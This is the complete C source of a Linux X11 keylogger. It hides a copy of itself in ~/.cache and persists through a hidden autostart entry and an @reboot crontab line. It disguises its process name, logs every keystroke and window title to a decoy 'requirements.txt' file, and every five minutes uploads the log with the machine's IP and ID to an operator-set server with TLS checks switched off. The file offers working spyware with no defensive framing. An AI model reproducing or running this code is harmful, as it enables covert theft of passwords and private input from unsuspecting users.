#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <libgen.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/XKBlib.h>
#include <X11/XF86keysym.h>
#include <X11/keysym.h>
#include <ctype.h>

#define SERVER "" // write DNS record of server (without http:// or https://)
#define SCRIPT_PATH "/receiver.php"
#define LOG_FILE "requirements.txt"
#define UPLOAD_INTERVAL 300 // change if needed (in seconds)
#define TITLE_LEN 1024
#define KEY_BUF_LEN 255
#define MAX_PATH_LEN 1024
#define SLEEP_MS 20

void getMachineID(char *buffer, int size) {
    struct utsname sysInfo;
    char *user = getenv("USER") ?: "unknown";
    if (uname(&sysInfo) == 0) snprintf(buffer, size, "%s-%s", sysInfo.nodename, user);
    else snprintf(buffer, size, "UNKNOWN-%s", user);
}

void getLocalIP(char *buffer, int size) {
    struct ifaddrs *ifa, *ifap;
    struct sockaddr_in *sin;
    if (getifaddrs(&ifap) != 0) { snprintf(buffer, size, "127.0.0.1"); return; }
    for (ifa = ifap; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;
        if (!(ifa->ifa_flags & IFF_UP) || !(ifa->ifa_flags & IFF_RUNNING)) continue;
        if (strcmp(ifa->ifa_name, "lo") == 0) continue;
        if (strstr(ifa->ifa_name, "docker") || strstr(ifa->ifa_name, "veth") || strstr(ifa->ifa_name, "virbr") || strstr(ifa->ifa_name, "vnet") || strstr(ifa->ifa_name, "tun") || strstr(ifa->ifa_name, "tap")) continue;
        sin = (struct sockaddr_in *)ifa->ifa_addr;
        if (inet_ntop(AF_INET, &sin->sin_addr, buffer, size) != NULL) {
            freeifaddrs(ifap);
            return;
        }
    }
    snprintf(buffer, size, "127.0.0.1");
    freeifaddrs(ifap);
}

void installToStartup() {
    char myPath[MAX_PATH_LEN], destPath[MAX_PATH_LEN], hiddenDir[MAX_PATH_LEN], deskPath[MAX_PATH_LEN];
    char *home = getenv("HOME");
    if (!home) return;
    snprintf(hiddenDir, sizeof(hiddenDir), "%s/.cache/.x11-helper", home);
    mkdir(hiddenDir, 0700);
    ssize_t len = readlink("/proc/self/exe", myPath, sizeof(myPath) - 1);
    if (len == -1) return;
    myPath[len] = '\0';
    snprintf(destPath, sizeof(destPath), "%s/.driver", hiddenDir);
    if (strcmp(myPath, destPath) == 0) return;
    FILE *src = fopen(myPath, "rb");
    FILE *dst = fopen(destPath, "wb");
    if (src && dst) {
        char buf[4096]; size_t n;
        while ((n = fread(buf, 1, sizeof(buf), src)) > 0) fwrite(buf, 1, n, dst);
        fclose(src); fclose(dst);
    } else {
        if (src) fclose(src);
        if (dst) fclose(dst);
        return;
    }
    snprintf(deskPath, sizeof(deskPath), "%s/.config/autostart/.x11-helper.desktop", home);
    FILE *f = fopen(deskPath, "w");
    if (f) {
        fprintf(f, "[Desktop Entry]\nType=Application\nName=X11 Helper\nExec=%s\nHidden=true\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\nX-GNOME-Autostart-Phase=Applications\nTerminal=false\n", destPath);
        fclose(f);
    }
    FILE *crontab = popen("crontab -l 2>/dev/null", "r");
    if (crontab) {
        char line[256]; int found = 0;
        while (fgets(line, sizeof(line), crontab)) { if (strstr(line, destPath)) { found = 1; break; } }
        pclose(crontab);
        if (!found) {
            FILE *tmp = fopen("/tmp/cron_tmp", "w");
            crontab = popen("crontab -l 2>/dev/null", "r");
            if (crontab) while (fgets(line, sizeof(line), crontab)) fprintf(tmp, "%s", line);
            pclose(crontab);
            fprintf(tmp, "@reboot %s\n", destPath);
            fclose(tmp);
            system("crontab /tmp/cron_tmp && rm /tmp/cron_tmp");
        }
    }
}

void uploadLog(const char *filepath) {
    FILE *f = fopen(filepath, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (fsize == 0) { fclose(f); return; }
    char *buffer = (char *)malloc(fsize + 1);
    if (!buffer) { fclose(f); return; }
    fread(buffer, 1, fsize, f);
    fclose(f);
    buffer[fsize] = 0;
    char localIP[64] = "127.0.0.1";
    getLocalIP(localIP, sizeof(localIP));
    char *payload = (char *)malloc(fsize + 70);
    if (payload) {
        snprintf(payload, fsize + 70, "%s\n", localIP);
        strcat(payload, buffer);
    } else {
        payload = buffer;
    }
    char machineID[256];
    getMachineID(machineID, sizeof(machineID));
    CURL *curl = curl_easy_init();
    if (curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: text/plain");
        char header_str[300];
        snprintf(header_str, sizeof(header_str), "X-ID: %s", machineID);
        headers = curl_slist_append(headers, header_str);
        char url[1024];
        snprintf(url, sizeof(url), "https://%s%s", SERVER, SCRIPT_PATH);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        if (curl_easy_perform(curl) == CURLE_OK) {
            f = fopen(filepath, "w");
            if (f) {
                fprintf(f, "%s\n", localIP);
                fclose(f);
            }
        }
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    free(payload);
    if (payload != buffer) free(buffer);
}

void getKeyName(int keycode, char *buffer, Display *dpy) {
    buffer[0] = '\0';
    KeySym keysym = XkbKeycodeToKeysym(dpy, keycode, 0, 0);
    if (keysym == XK_Shift_L || keysym == XK_Shift_R) snprintf(buffer, KEY_BUF_LEN, "[SHIFT]");
    else if (keysym == XK_Control_L || keysym == XK_Control_R) snprintf(buffer, KEY_BUF_LEN, "[CTRL]");
    else if (keysym == XK_Alt_L || keysym == XK_Alt_R) snprintf(buffer, KEY_BUF_LEN, "[ALT]");
    else if (keysym == XK_Super_L || keysym == XK_Super_R) snprintf(buffer, KEY_BUF_LEN, "[WIN]");
    else if (keysym == XK_space) snprintf(buffer, KEY_BUF_LEN, "[SPACE]");
    else if (keysym == XK_Return || keysym == XK_KP_Enter) snprintf(buffer, KEY_BUF_LEN, "[ENTER]");
    else if (keysym == XK_BackSpace) snprintf(buffer, KEY_BUF_LEN, "[BACKSPACE]");
    else if (keysym == XK_Tab) snprintf(buffer, KEY_BUF_LEN, "[TAB]");
    else if (keysym == XK_Escape) snprintf(buffer, KEY_BUF_LEN, "[ESC]");
    else if (keysym == XK_Delete) snprintf(buffer, KEY_BUF_LEN, "[DELETE]");
    else if (keysym == XK_Insert) snprintf(buffer, KEY_BUF_LEN, "[INSERT]");
    else if (keysym == XK_Home) snprintf(buffer, KEY_BUF_LEN, "[HOME]");
    else if (keysym == XK_End) snprintf(buffer, KEY_BUF_LEN, "[END]");
    else if (keysym == XK_Prior) snprintf(buffer, KEY_BUF_LEN, "[PAGE_UP]");
    else if (keysym == XK_Next) snprintf(buffer, KEY_BUF_LEN, "[PAGE_DOWN]");
    else if (keysym == XK_Up) snprintf(buffer, KEY_BUF_LEN, "[UP]");
    else if (keysym == XK_Down) snprintf(buffer, KEY_BUF_LEN, "[DOWN]");
    else if (keysym == XK_Left) snprintf(buffer, KEY_BUF_LEN, "[LEFT]");
    else if (keysym == XK_Right) snprintf(buffer, KEY_BUF_LEN, "[RIGHT]");
    else if (keysym >= XK_F1 && keysym <= XK_F12) snprintf(buffer, KEY_BUF_LEN, "[F%d]", (int)(keysym - XK_F1 + 1));
    else {
        char *str = XKeysymToString(keysym);
        if (str && strlen(str) > 0) {
            strncpy(buffer, str, KEY_BUF_LEN - 1);
            buffer[KEY_BUF_LEN - 1] = '\0';
        } else {
            buffer[0] = '\0';
        }
    }
}

int main() {
    installToStartup();
    prctl(PR_SET_NAME, "xdg-config", 0, 0, 0);
    char outputPath[MAX_PATH_LEN];
    char *home = getenv("HOME");
    char fallbackPath[MAX_PATH_LEN];
    if (home) {
        snprintf(outputPath, sizeof(outputPath), "%s/Documents/%s", home, LOG_FILE);
        char docDir[MAX_PATH_LEN];
        snprintf(docDir, sizeof(docDir), "%s/Documents", home);
        mkdir(docDir, 0755);
        snprintf(fallbackPath, sizeof(fallbackPath), "%s/%s", home, LOG_FILE);
    } else {
        strcpy(outputPath, LOG_FILE);
        strcpy(fallbackPath, LOG_FILE);
    }
    FILE *file = fopen(outputPath, "a");
    if (!file) {
        file = fopen(fallbackPath, "a");
        if (!file) return 1;
    }
    Display *dpy = XOpenDisplay(NULL);
    if (!dpy) return 1;
    char currentTitle[TITLE_LEN] = {0};
    char previousTitle[TITLE_LEN] = {0};
    unsigned char key_state[256] = {0};
    time_t lastUploadTime = time(NULL);
    sleep(5);
    while (1) {
        usleep(SLEEP_MS * 1000);
        if (dpy) {
            Window focused; int revert;
            XGetInputFocus(dpy, &focused, &revert);
            if (focused != None) {
                char *title = NULL;
                if (XFetchName(dpy, focused, &title) && title && strlen(title) > 0) strncpy(currentTitle, title, TITLE_LEN - 1);
                XFree(title);
            }
        }
        if (strcmp(currentTitle, previousTitle) != 0) {
            strcpy(previousTitle, currentTitle);
            fprintf(file, "\n\n[WIN: %s]\n", currentTitle);
            fflush(file);
        }
        if (dpy) {
            char keymap[32] = {0};
            XQueryKeymap(dpy, keymap);
            for (int i = 8; i < 256; i++) {
                int byte = i / 8; int bit = 7 - (i % 8);
                int is_pressed = (keymap[byte] & (1 << bit)) ? 1 : 0;
                if (is_pressed && key_state[i] == 0) {
                    char keyName[KEY_BUF_LEN] = {0};
                    getKeyName(i, keyName, dpy);
                    if (strlen(keyName) > 0) {
                        if (keyName[0] == '[' && keyName[strlen(keyName) - 1] == ']') fprintf(file, " %s ", keyName);
                        else fprintf(file, "%s", keyName);
                        fflush(file);
                    }
                    key_state[i] = 1;
                }
                if (!is_pressed) key_state[i] = 0;
            }
        }
        time_t now = time(NULL);
        if (now - lastUploadTime >= UPLOAD_INTERVAL) {
            fclose(file);
            uploadLog(outputPath);
            file = fopen(outputPath, "a");
            if (!file) { file = fopen(fallbackPath, "a"); if (!file) return 1; }
            lastUploadTime = now;
        }
    }
    if (dpy) XCloseDisplay(dpy);
    fclose(file);
    return 0;
}
